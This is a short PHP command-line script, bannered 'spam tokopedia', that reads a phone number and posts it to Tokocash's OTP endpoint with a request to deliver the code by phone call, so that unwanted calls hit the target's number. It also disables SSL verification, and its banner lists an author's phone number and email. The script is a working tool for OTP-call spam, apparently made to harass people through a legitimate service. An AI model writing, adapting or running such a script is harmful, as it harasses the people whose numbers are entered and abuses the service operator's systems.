<?php


echo "\033[1;35m                             _        _                        _ _
 ___ _ __   __ _ _ __ ___   | |_ ___ | | _____  _ __   ___  __| (_) __ _
/ __| '_ \ / _` | '_ ` _ \  | __/ _ \| |/ / _ \| '_ \ / _ \/ _` | |/ _` |
\__ \ |_) | (_| | | | | | | | || (_) |   < (_) | |_) |  __/ (_| | | (_| |
|___/ .__/ \__,_|_| |_| |_|  \__\___/|_|\_\___/| .__/ \___|\__,_|_|\__,_|
    |_|                                        |_|

\033[0;32m=========================================================================
\033[1;32mAuthor Oleh\033[1;31m :\033[1;0mWahyu Sibran
\033[1;32mContac \033[1;31m     :\033[1;0m087730882553
\033[1;32mEmail \033[1;31m      :\033[1;0mWakhyus@gmail.com
";
echo "\n\n\n";

// Limit 3x Telpon Setiap Satu Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "Nomor\nInput : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
